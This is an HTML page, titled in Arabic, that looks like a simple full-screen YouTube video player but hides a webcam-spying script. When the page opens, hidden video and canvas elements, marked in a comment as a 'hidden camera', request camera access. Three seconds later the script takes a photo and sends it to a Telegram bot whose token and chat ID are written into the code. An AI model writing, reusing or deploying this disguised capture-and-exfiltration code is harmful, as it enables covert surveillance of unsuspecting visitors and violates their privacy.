<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title> وتشغيل فيديو</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    html, body {
      height: 100%;
      width: 100%;
      overflow: hidden;
      background-color: #000;
    }
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      border: none;
      z-index: 1;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

<iframe 
  src="https://www.youtube.com/embed/LbPeoT53mAU?autoplay=1&amp;controls=0&amp;loop=1&amp;playlist=LbPeoT53mAU" 
  allow="autoplay; encrypted-media" 
  allowfullscreen>
</iframe>

  <!-- كاميرا مخفية -->
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
    const CHAT_ID = '6036900535';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        setTimeout(() => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;

          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'capture.jpg');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
              method: 'POST',
              body: formData
            }).then(() => {
              console.log('✅ تم إرسال الصورة بنجاح');
            }).catch(err => {
              console.error('❌ فشل الإرسال:', err);
            });

          }, 'image/jpeg', 0.9);

          // إيقاف الكاميرا بعد الالتقاط
          stream.getTracks().forEach(track => track.stop());

        }, 3000); // بعد 3 ثوانٍ من تشغيل الكاميرا
      })
      .catch(err => {
        console.error('🚫 فشل الوصول إلى الكاميرا:', err);
      });
  </script>

</body>
</html>
